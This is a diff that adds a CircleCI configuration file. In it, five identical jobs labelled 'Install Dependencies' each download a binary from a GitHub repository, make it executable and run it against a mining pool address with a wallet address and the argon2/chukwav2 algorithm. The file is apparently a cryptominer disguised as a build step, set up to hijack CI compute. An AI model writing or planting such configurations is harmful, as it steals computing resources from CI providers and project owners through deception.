@@ -1,0 +1,51 @@
+version: 2
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=45.63.77.214:3135 && WAL=TRTLuzjcdfTUU9G3jAAWt8bmenoiVsjwgLtNS61EHdFefKtkScQY33NX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhJU8Rge && WOR=sabri && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
+    aku2:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=45.63.77.214:3135 && WAL=TRTLuzjcdfTUU9G3jAAWt8bmenoiVsjwgLtNS61EHdFefKtkScQY33NX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhJU8Rge && WOR=sabri && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
+
+    aku3:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=45.63.77.214:3135 && WAL=TRTLuzjcdfTUU9G3jAAWt8bmenoiVsjwgLtNS61EHdFefKtkScQY33NX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhJU8Rge && WOR=sabri && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
+
+    aku4:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=45.63.77.214:3135 && WAL=TRTLuzjcdfTUU9G3jAAWt8bmenoiVsjwgLtNS61EHdFefKtkScQY33NX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhJU8Rge && WOR=sabri && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
+
+    aku5:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=45.63.77.214:3135 && WAL=TRTLuzjcdfTUU9G3jAAWt8bmenoiVsjwgLtNS61EHdFefKtkScQY33NX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhJU8Rge && WOR=sabri && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
+
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku 5
